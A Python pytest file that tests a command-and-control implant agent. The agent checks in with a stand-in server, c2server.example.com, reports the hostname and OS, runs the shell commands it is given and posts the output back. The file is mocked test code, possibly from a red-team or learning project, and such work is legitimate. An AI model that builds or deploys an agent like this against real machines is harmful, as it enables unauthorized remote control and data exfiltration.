import pytest
import requests
import subprocess
from unittest.mock import patch, Mock, MagicMock, mock_open
from src.agent.comms import perform_checkin, send_results
from src.agent.config import load_config
from src.agent.state import get_agent_id, save_agent_id, STATE_FILE
from src.agent.tasking import execute_task
from src.agent.core import agent_iteration


# Testing agent.comms
@pytest.fixture
def api_setup():
    return {
        "url": "https://c2server.example.com/checkin",
        "results_url": "https://c2server.example.com/results",
        "data": {"agentId": "EXISTING-AGENT-ID-456", "hostname": "test-host"},
        "task_result": "test-result",
    }


@patch("src.agent.comms.requests.post")
def test_perform_checkin_returns_json_on_http_200(mock_post, api_setup):
    expected = {
        "message": "Check-in successful",
        "agentId": "EXISTING-AGENT-ID-456",
        "task": "no-task-for-now",
    }
    mock_response = Mock()
    mock_response.json.return_value = expected
    mock_response.raise_for_status.return_value = None
    mock_post.return_value = mock_response

    result = perform_checkin(api_setup["url"], api_setup["data"])

    assert result == expected
    mock_post.assert_called_once_with(api_setup["url"], json=api_setup["data"], timeout=10)


@patch("src.agent.comms.requests.post")
def test_perform_checkin_returns_none_on_network_failure(mock_post, api_setup):
    mock_post.side_effect = requests.exceptions.Timeout()

    result = perform_checkin(api_setup["url"], api_setup["data"])

    assert result is None
    mock_post.assert_called_once_with(api_setup["url"], json=api_setup["data"], timeout=10)


@patch("src.agent.comms.requests.post")
def test_perform_checkin_returns_none_on_http_error(mock_post, api_setup):
    mock_post.side_effect = requests.exceptions.HTTPError()

    result = perform_checkin(api_setup["url"], api_setup["data"])

    assert result is None
    mock_post.assert_called_once_with(api_setup["url"], json=api_setup["data"], timeout=10)


@patch("src.agent.comms.requests.post")
def test_send_results_returns_true_on_http_200(mock_post, api_setup):
    mock_response = Mock()
    mock_response.raise_for_status.return_value = None
    mock_post.return_value = mock_response

    agent_id = api_setup["data"]["agentId"]
    task_result = api_setup["task_result"]
    payload = {"agentId": agent_id, "taskResult": task_result}

    result = send_results(api_setup["results_url"], agent_id, task_result)

    assert result
    mock_post.assert_called_once_with(api_setup["results_url"], json=payload, timeout=10)


@patch("src.agent.comms.requests.post")
def test_send_results_returns_false_on_network_failure(mock_post, api_setup):
    mock_post.side_effect = requests.exceptions.Timeout()

    agent_id = api_setup["data"]["agentId"]
    task_result = api_setup["task_result"]
    payload = {"agentId": agent_id, "taskResult": task_result}

    result = send_results(api_setup["results_url"], agent_id, task_result)

    assert not result
    mock_post.assert_called_once_with(api_setup["results_url"], json=payload, timeout=10)


@patch("src.agent.comms.requests.post")
def test_send_results_returns_false_on_http_error(mock_post, api_setup):
    mock_post.side_effect = requests.exceptions.HTTPError()

    agent_id = api_setup["data"]["agentId"]
    task_result = api_setup["task_result"]
    payload = {"agentId": agent_id, "taskResult": task_result}

    result = send_results(api_setup["results_url"], agent_id, task_result)

    assert not result
    mock_post.assert_called_once_with(api_setup["results_url"], json=payload, timeout=10)


# Testing agent.config
@pytest.fixture
def config_setup():
    return {
        "api_url": "CheckInApiUrlTest",
        "sleep_interval": 60,
        "results_url": "StoreResultsApiUrlTest",
    }


@patch("configparser.ConfigParser")
def test_load_config_parses_file_successfully(mock_config_parser, config_setup):
    mock_instance = MagicMock()

    mock_section = {
        "api_url": config_setup["api_url"],
        "sleep_interval": str(config_setup["sleep_interval"]),
        "results_url": config_setup["results_url"],
    }

    mock_instance.__getitem__.return_value = mock_section
    mock_instance.getint.return_value = config_setup["sleep_interval"]

    mock_config_parser.return_value = mock_instance

    api_url_result, sleep_interval_result, results_url_result = load_config()

    assert api_url_result == config_setup["api_url"]
    assert sleep_interval_result == config_setup["sleep_interval"]
    assert results_url_result == config_setup["results_url"]

    mock_config_parser.assert_called_once()
    mock_instance.read.assert_called_once_with("src/agent/config.ini")
    mock_instance.getint.assert_called_once_with("c2", "sleep_interval")


@patch("configparser.ConfigParser")
def test_load_config_raises_error_when_file_not_found(mock_config_parser, config_setup):
    mock_instance = MagicMock()

    mock_instance.read.return_value = []
    mock_config_parser.return_value = mock_instance

    with pytest.raises(FileNotFoundError):
        load_config()

    mock_config_parser.assert_called_once()
    mock_instance.read.assert_called_once_with("src/agent/config.ini")


@patch("configparser.ConfigParser")
def test_load_config_raises_error_when_missing_key(mock_config_parser, config_setup):
    mock_instance = MagicMock()

    mock_section = {
        "sleep_interval": str(config_setup["sleep_interval"]),
        "results_url": config_setup["results_url"],
    }

    mock_instance.__getitem__.return_value = mock_section
    mock_instance.getint.return_value = config_setup["sleep_interval"]

    mock_config_parser.return_value = mock_instance

    with pytest.raises(KeyError):
        load_config()

    mock_config_parser.assert_called_once()
    mock_instance.read.assert_called_once_with("src/agent/config.ini")


@patch("configparser.ConfigParser")
def test_load_config_raises_error_when_invalid_value(mock_config_parser, config_setup):
    mock_instance = MagicMock()

    mock_section = {
        "api_url": config_setup["api_url"],
        "results_url": config_setup["results_url"],
    }

    mock_instance.__getitem__.return_value = mock_section
    mock_instance.getint.side_effect = ValueError("invalid literal for int() with base 10")
    mock_config_parser.return_value = mock_instance

    with pytest.raises(ValueError):
        load_config()

    mock_config_parser.assert_called_once()
    mock_instance.read.assert_called_once_with("src/agent/config.ini")


# Testing agent.state
def test_get_agent_id_reads_id_from_existing_file(mocker):
    fake_file_content = "  EXISTING-AGENT-ID-456  \n"
    expected_id = "EXISTING-AGENT-ID-456"

    mocker.patch("os.path.exists", return_value=True)
    mocker.patch("builtins.open", mock_open(read_data=fake_file_content))

    agent_id = get_agent_id()

    assert agent_id == expected_id


def test_get_agent_id_returns_none_when_file_not_found(mocker):
    mocker.patch("os.path.exists", return_value=False)

    agent_id = get_agent_id()
    assert agent_id is None


def test_get_agent_id_returns_none_for_empty_file(mocker):
    mocker.patch("os.path.exists", return_value=True)
    mocker.patch("builtins.open", mock_open(read_data=""))

    agent_id = get_agent_id()

    assert agent_id is None


def test_save_agent_id_writes_id_to_file_correctly(mocker):
    content_to_write = "NEW-AGENT-ID-456"

    mock_open_write = mock_open()
    mocker.patch("builtins.open", mock_open_write)

    save_agent_id(content_to_write)
    mock_open_write.assert_called_once_with(STATE_FILE, "w")
    mock_open_write().write.assert_called_once_with(content_to_write)


# Testing agent.tasking
@patch("src.agent.tasking.subprocess.run")
def test_execute_task_returns_stdout_on_success(mock_run):
    command = "Testing Command"
    command_out = "Testing Command Success"

    mock_run.return_value = Mock(stdout=command_out, stderr="", returncode=0)

    result = execute_task(command)
    assert result == command_out
    mock_run.assert_called_once_with(command, shell=True, capture_output=True, text=True, timeout=30)


@patch("src.agent.tasking.subprocess.run")
def test_execute_task_returns_stderr_on_command_failure(mock_run):
    command = "Testing Command"
    command_out = "Testing command not found"

    mock_run.return_value = Mock(stdout="", stderr="Testing command not found", returncode=1)

    result = execute_task(command)
    assert result == f"Error: {command_out}"

    mock_run.assert_called_once_with(command, shell=True, capture_output=True, text=True, timeout=30)


@patch("src.agent.tasking.subprocess.run")
def test_execute_task_returns_error_string_on_exception(mock_run):
    command = "Testing Command"

    mock_exception = subprocess.TimeoutExpired(cmd=command, timeout=30)
    mock_run.side_effect = mock_exception

    result = execute_task(command)

    assert "Failed to execute command on host" in result
    assert str(mock_exception) in result

    mock_run.assert_called_once_with(command, shell=True, capture_output=True, text=True, timeout=30)


# Testing agent.core
def test_agent_iteration_handles_new_agent_registration(mocker):
    fake_api_url = "https://c2server.example.com/checkin"
    fake_results_url = "https://c2server.example.com/results"
    fake_sleep = 60
    fake_new_id = "NEW-AGENT-ID-456"
    fake_hostname = "test-host"
    fake_osname = "test-os 19"

    mock_get_id = mocker.patch("src.agent.core.state.get_agent_id", return_value=None)
    mock_hostname = mocker.patch("src.agent.core.socket.gethostname", return_value=fake_hostname)
    mock_osname_system = mocker.patch("src.agent.core.platform.system", return_value="test-os")
    mock_osname_release = mocker.patch("src.agent.core.platform.release", return_value="19")

    mock_checkin_response = {"agentId": fake_new_id, "task": "no-task-for-now"}
    mock_checkin = mocker.patch("src.agent.core.comms.perform_checkin", return_value=mock_checkin_response)

    mock_save_id = mocker.patch("src.agent.core.state.save_agent_id")

    mock_execute_task = mocker.patch("src.agent.core.tasking.execute_task")
    mock_send_results = mocker.patch("src.agent.core.comms.send_results")

    agent_iteration(fake_api_url, fake_results_url, fake_sleep)

    mock_get_id.assert_called_once()

    mock_hostname.assert_called_once()
    mock_osname_system.assert_called_once()
    mock_osname_release.assert_called_once()

    expected_payload = {"hostname": fake_hostname, "os_name": fake_osname}

    mock_checkin.assert_called_once_with(fake_api_url, expected_payload)

    mock_save_id.assert_called_once_with(fake_new_id)

    mock_execute_task.assert_not_called()
    mock_send_results.assert_not_called()


def test_agent_iteration_handles_existing_agent_without_task(mocker):
    fake_api_url = "https://c2server.example.com/checkin"
    fake_results_url = "https://c2server.example.com/results"
    fake_sleep = 60
    fake_agent_id = "EXISTING-AGENT-ID-456"
    fake_hostname = "test-host"
    fake_osname = "test-os 19"

    mock_get_id = mocker.patch("src.agent.core.state.get_agent_id", return_value=fake_agent_id)
    mock_hostname = mocker.patch("src.agent.core.socket.gethostname", return_value=fake_hostname)
    mock_osname_system = mocker.patch("src.agent.core.platform.system", return_value="test-os")
    mock_osname_release = mocker.patch("src.agent.core.platform.release", return_value="19")

    mock_checkin_response = {"agentId": fake_agent_id, "task": "no-task-for-now"}
    mock_checkin = mocker.patch("src.agent.core.comms.perform_checkin", return_value=mock_checkin_response)

    mock_save_id = mocker.patch("src.agent.core.state.save_agent_id")

    mock_execute_task = mocker.patch("src.agent.core.tasking.execute_task")
    mock_send_results = mocker.patch("src.agent.core.comms.send_results")

    agent_iteration(fake_api_url, fake_results_url, fake_sleep)

    mock_get_id.assert_called_once()

    mock_hostname.assert_called_once()
    mock_osname_system.assert_called_once()
    mock_osname_release.assert_called_once()

    expected_payload = {
        "hostname": fake_hostname,
        "os_name": fake_osname,
        "agentId": fake_agent_id,
    }

    mock_checkin.assert_called_once_with(fake_api_url, expected_payload)

    mock_save_id.assert_called_once_with(fake_agent_id)

    mock_execute_task.assert_not_called()
    mock_send_results.assert_not_called()


def test_agent_iteration_handles_existing_agent_with_task(mocker):
    fake_api_url = "https://c2server.example.com/checkin"
    fake_results_url = "https://c2server.example.com/results"
    fake_sleep = 60
    fake_agent_id = "EXISTING-AGENT-ID-456"
    fake_hostname = "test-host"
    fake_osname = "test-os 19"
    fake_task = "test-task"

    mock_get_id = mocker.patch("src.agent.core.state.get_agent_id", return_value=fake_agent_id)
    mock_hostname = mocker.patch("src.agent.core.socket.gethostname", return_value=fake_hostname)
    mock_osname_system = mocker.patch("src.agent.core.platform.system", return_value="test-os")
    mock_osname_release = mocker.patch("src.agent.core.platform.release", return_value="19")

    mock_checkin_response = {"agentId": fake_agent_id, "task": fake_task}
    mock_checkin = mocker.patch("src.agent.core.comms.perform_checkin", return_value=mock_checkin_response)

    mock_save_id = mocker.patch("src.agent.core.state.save_agent_id")

    expected_task_out = "test-task run successfully"
    mock_execute_task = mocker.patch("src.agent.core.tasking.execute_task", return_value=expected_task_out)
    mock_send_results = mocker.patch("src.agent.core.comms.send_results", return_value=True)

    agent_iteration(fake_api_url, fake_results_url, fake_sleep)

    mock_get_id.assert_called_once()

    mock_hostname.assert_called_once()
    mock_osname_system.assert_called_once()
    mock_osname_release.assert_called_once()

    expected_payload = {
        "hostname": fake_hostname,
        "os_name": fake_osname,
        "agentId": fake_agent_id,
    }

    mock_checkin.assert_called_once_with(fake_api_url, expected_payload)

    mock_save_id.assert_called_once_with(fake_agent_id)

    mock_execute_task.assert_called_once_with(fake_task)
    mock_send_results.assert_called_once_with(fake_results_url, fake_agent_id, expected_task_out)


def test_agent_iteration_handles_checkin_failure_gracefully(mocker):
    fake_api_url = "https://c2server.example.com/checkin"
    fake_results_url = "https://c2server.example.com/results"
    fake_sleep = 60
    fake_agent_id = "EXISTING-AGENT-ID-456"
    fake_hostname = "test-host"
    fake_osname = "test-os 19"

    mock_get_id = mocker.patch("src.agent.core.state.get_agent_id", return_value=fake_agent_id)
    mock_hostname = mocker.patch("src.agent.core.socket.gethostname", return_value=fake_hostname)
    mock_osname_system = mocker.patch("src.agent.core.platform.system", return_value="test-os")
    mock_osname_release = mocker.patch("src.agent.core.platform.release", return_value="19")

    mock_checkin = mocker.patch("src.agent.core.comms.perform_checkin", return_value=None)

    mock_save_id = mocker.patch("src.agent.core.state.save_agent_id")
    mock_execute_task = mocker.patch("src.agent.core.tasking.execute_task")
    mock_send_results = mocker.patch("src.agent.core.comms.send_results")
    mock_print = mocker.patch("builtins.print")

    agent_iteration(fake_api_url, fake_results_url, fake_sleep)

    mock_get_id.assert_called_once()
    mock_hostname.assert_called_once()
    mock_osname_system.assert_called_once()
    mock_osname_release.assert_called_once()

    expected_payload = {
        "hostname": fake_hostname,
        "os_name": fake_osname,
        "agentId": fake_agent_id,
    }
    mock_checkin.assert_called_once_with(fake_api_url, expected_payload)

    mock_save_id.assert_not_called()
    mock_execute_task.assert_not_called()
    mock_send_results.assert_not_called()

    mock_print.assert_any_call(f"[INFO] Check-in failed. Trying again in {fake_sleep}s.")


def test_agent_iteration_handles_with_no_agent_in_checkin(mocker):
    fake_api_url = "https://c2server.example.com/checkin"
    fake_results_url = "https://c2server.example.com/results"
    fake_sleep = 60
    fake_agent_id = "EXISTING-AGENT-ID-456"
    fake_hostname = "test-host"
    fake_osname = "test-os 19"
    fake_task = "test-task"

    mock_get_id = mocker.patch("src.agent.core.state.get_agent_id", return_value=fake_agent_id)
    mock_hostname = mocker.patch("src.agent.core.socket.gethostname", return_value=fake_hostname)
    mock_osname_system = mocker.patch("src.agent.core.platform.system", return_value="test-os")
    mock_osname_release = mocker.patch("src.agent.core.platform.release", return_value="19")

    mock_checkin_response = {"task": fake_task}
    mock_checkin = mocker.patch("src.agent.core.comms.perform_checkin", return_value=mock_checkin_response)

    expected_task_out = "test-task run successfully"
    mock_execute_task = mocker.patch("src.agent.core.tasking.execute_task", return_value=expected_task_out)
    mock_send_results = mocker.patch("src.agent.core.comms.send_results", return_value=True)

    agent_iteration(fake_api_url, fake_results_url, fake_sleep)

    expected_payload = {
        "hostname": fake_hostname,
        "os_name": fake_osname,
        "agentId": fake_agent_id,
    }

    mock_checkin.assert_called_once_with(fake_api_url, expected_payload)

    mock_execute_task.assert_called_once_with(fake_task)
    mock_send_results.assert_called_once_with(fake_results_url, fake_agent_id, expected_task_out)
